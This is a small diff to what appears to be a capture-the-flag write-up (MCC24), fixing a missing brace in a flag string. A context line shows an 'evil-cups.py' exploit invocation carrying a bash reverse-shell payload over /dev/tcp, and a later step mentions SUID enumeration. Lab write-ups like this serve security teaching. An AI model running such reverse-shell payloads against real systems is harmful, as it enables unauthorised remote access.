@@ -156,7 +156,7 @@ python3 evil-cups.py 172.20.10.4 172.20.10.6 'bash -c "bash -i >& /dev/tcp/172.2
 ![image](./static/image.webp)
 
 Once we enter the victim machine, the first flag is located at `/home/lp`, we can cat the `initial_flag.txt`
-**1st Flag:** `MCC24{h3ll0_fr0m_pr1nt1ng_s3rv1c3s`
+**1st Flag:** `MCC24{h3ll0_fr0m_pr1nt1ng_s3rv1c3s}`
 
 ### Step 12: Use tools suid3num to enumerate 
 
